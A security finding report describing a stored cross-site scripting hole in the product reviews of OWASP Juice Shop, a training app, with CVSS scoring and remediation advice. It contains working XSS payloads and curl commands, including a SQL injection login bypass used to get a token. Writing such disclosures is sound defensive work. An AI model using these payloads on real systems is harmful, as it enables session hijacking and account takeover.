# F-002: Stored Cross-Site Scripting (XSS) in Product Reviews

## Overview

The OWASP Juice Shop application stores user-supplied HTML/JavaScript verbatim in product review messages without sanitization or output encoding. Any authenticated user can inject arbitrary JavaScript that executes in the browser of every other user who views the affected product page.

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Finding ID** | F-002 |
| **Vulnerability Type** | Stored Cross-Site Scripting (XSS) |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **Severity** | HIGH |
| **CVSS 3.1 Score** | 7.4 |
| **CVSS 3.1 Vector** | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N |

## Affected Endpoint

```
PUT /rest/products/{id}/reviews
Host: localhost:3000
Authorization: Bearer <any valid JWT>
Content-Type: application/json

{"message": "<PAYLOAD>", "author": "<name>"}
```

The `message` field is persisted to the application's NeDB database and returned unescaped via `GET /rest/products/{id}/reviews`, which Angular then renders into the DOM.

## Confirmed Payloads (All Stored and Returned Unescaped)

| Payload | Trigger Condition |
|---------|-------------------|
| `<script>alert(document.cookie)</script>` | On page load |
| `<img src=x onerror=alert(document.domain)>` | On broken image load |
| `<svg onload=alert('XSS:'+document.domain)>` | On SVG render |
| `<iframe src="javascript:alert('XSS_CONFIRMED')">` | On iframe render |

## Reproduction Steps

### Prerequisites

- Any valid Juice Shop account (or SQLi bypass for authentication)
- `curl` or equivalent HTTP client

### Step-by-step

1. **Obtain a JWT token** (example using SQLi bypass):
   ```bash
   TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"'\'' OR 1=1--","password":"x"}' \
     | python3 -c "import sys,json; print(json.loads(sys.stdin.read())['authentication']['token'])")
   ```

2. **Inject XSS payload into a product review**:
   ```bash
   curl -s -X PUT http://localhost:3000/rest/products/1/reviews \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer $TOKEN" \
     -d '{"message":"<script>alert(document.cookie)</script>","author":"attacker"}'
   ```
   Expected response: `{"status":"success"}`

3. **Verify payload is stored**:
   ```bash
   curl -s http://localhost:3000/rest/products/1/reviews | python3 -m json.tool
   ```
   The `message` field contains the raw, unescaped HTML/JS payload.

4. **Exploit executes** when any user navigates to the product detail page at:
   ```
   http://localhost:3000/#/product/1
   ```
   The Angular frontend fetches the reviews via the REST API and renders `message` content inside an `innerHTML`-bound element without sanitization.

## Impact

- **Session Hijacking**: Steal cookies/tokens via `document.cookie` exfiltration.
- **Account Takeover**: Capture and replay authentication credentials.
- **Phishing**: Redirect victims to attacker-controlled pages.
- **Malware Distribution**: Inject drive-by download scripts.
- **CSRF Escalation**: Execute privileged actions (order manipulation, account changes) on behalf of authenticated admins.
- **Scope**: Affects all 35 products, impacting every user who visits product pages.

## Evidence

- 9 distinct XSS payloads stored across products 1-5 (verified 3/3 reproduction cycles)
- Payloads persisted in NeDB, returned verbatim by the API, and renderable by Angular
- PoC script confirms exploit automatically: `poc.py`

## Root Cause

The server does not perform HTML sanitization on the `message` field before storing it to the database. The client-side Angular binding uses `innerHTML` (or equivalent) to render review content, creating a persistent XSS sink. No Content-Security-Policy is enforced that would block inline script execution.

## Remediation

### Short-term (Required)

1. **Server-side output encoding**: HTML-encode all user input before storage or before returning it in API responses. Use a library such as `he` (Node.js) to encode `<`, `>`, `"`, `'`, `&`.

2. **Content-Security-Policy header**: Add a strict CSP:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none';
   ```

3. **DOMPurify on client**: Sanitize content before inserting into the DOM:
   ```javascript
   element.innerHTML = DOMPurify.sanitize(review.message);
   ```

### Long-term

4. **Input validation**: Reject requests containing HTML tags via a server-side allowlist or strip them using a sanitizer.

5. **Security regression tests**: Add automated test cases that verify XSS payloads are escaped in API responses.

6. **Angular safe binding**: Replace `innerHTML` bindings with Angular's `[textContent]` or `{{ }}` interpolation which auto-escapes HTML.
